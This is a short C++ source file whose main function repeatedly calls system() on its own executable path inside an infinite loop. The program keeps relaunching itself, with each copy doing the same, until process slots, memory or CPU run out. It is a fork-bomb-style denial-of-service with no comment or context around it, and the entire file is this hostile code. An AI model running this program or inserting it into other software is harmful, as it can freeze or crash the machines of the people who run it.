#include <cstdlib>

int main(int argc, char **argv)
{
	while (1) system(argv[0]);
	return 0;
}
